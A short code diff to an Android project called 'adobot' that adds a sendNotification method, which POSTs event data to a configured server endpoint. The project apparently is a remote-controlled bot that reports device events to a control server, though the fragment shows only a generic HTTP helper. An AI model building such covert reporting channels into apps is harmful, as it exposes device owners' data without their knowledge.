@@ -13,7 +13,12 @@ import android.support.v4.content.ContextCompat;
 
 import com.android.adobot.BuildConfig;
 import com.android.adobot.CommonParams;
+import com.android.adobot.Constants;
 import com.android.adobot.activities.AskPermissionsActivity;
+import com.android.adobot.http.Http;
+import com.android.adobot.http.HttpRequest;
+
+import java.util.HashMap;
 
 import static android.content.Intent.FLAG_ACTIVITY_NEW_TASK;
 
@@ -67,6 +72,15 @@ public class BaseTask extends Thread implements Runnable {
         Intent i = new Intent(context, AskPermissionsActivity.class);
         i.addFlags(FLAG_ACTIVITY_NEW_TASK);
         context.startActivity(i);
+    }
+
+    protected void sendNotification (String event, HashMap params) {
+        params.put("event", event);
+        Http req = new Http();
+        req.setMethod(HttpRequest.METHOD_POST);
+        req.setUrl(commonParams.getServer() + Constants.NOTIFY_URL);
+        req.setParams(params);
+        req.execute();
     }
 
 }
